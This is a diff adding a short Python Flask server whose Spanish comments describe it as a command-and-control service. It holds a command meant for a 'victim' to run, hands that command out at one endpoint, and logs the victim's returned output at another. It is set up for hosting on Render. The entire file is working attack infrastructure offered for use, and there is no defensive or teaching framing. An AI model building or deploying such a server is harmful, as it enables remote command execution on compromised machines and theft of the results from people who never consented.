@@ -1,0 +1,38 @@
+from flask import Flask, request, jsonify
+import os
+
+app = Flask(__name__)
+
+# Aquí guardaremos el comando que queremos que la víctima ejecute
+# En un entorno real, podrías cambiar esto dinámicamente
+COMMAND_FILE = "comando.txt"
+
+@app.route('/')
+def index():
+    return "Servidor Activo", 200
+
+@app.route('/get_command', methods=['GET'])
+def get_command():
+    # Leemos el comando desde el archivo
+    if os.path.exists(COMMAND_FILE):
+        with open(COMMAND_FILE, "r") as f:
+            cmd = f.read().strip()
+        return cmd if cmd else "nada"
+    return "nada"
+
+@app.route('/post_result', methods=['POST'])
+def post_result():
+    # Recibimos el resultado de la víctima
+    result = request.data.decode('utf-8')
+    print(f"\n[!] Resultado recibido:\n{result}")
+    
+    # Guardamos el resultado en un log para leerlo después
+    with open("log.txt", "a") as f:
+        f.write(f"\n--- Nuevo Resultado ---\n{result}\n")
+    
+    return "OK", 200
+
+if __name__ == "__main__":
+    # Render asigna un puerto automáticamente
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
